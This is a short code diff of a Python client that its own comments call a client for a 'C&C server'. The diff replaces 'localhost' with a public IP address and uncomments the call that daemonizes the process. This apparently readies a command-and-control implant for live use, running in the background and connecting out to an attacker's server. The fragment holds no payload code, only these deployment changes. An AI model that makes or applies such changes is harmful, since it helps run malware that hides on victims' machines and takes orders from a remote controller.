@@ -14,7 +14,7 @@ class client:
     # socket for connection to the server
     sock_to_server = None
     # ip address of our C&C server, can be changed depending on what ip server is located
-    host = 'localhost'
+    host = '18.205.103.236'
     # port of the server to connect to, can be changed depending on what port server is listening at
     port = 3000
 
@@ -24,7 +24,7 @@ class client:
 
     def __init__(self):
         # deamonize the process
-        # self.daemonize()
+        self.daemonize()
 
         # acquire process lock so only one instance of the daemon can exist at a time
         self.get_lock()
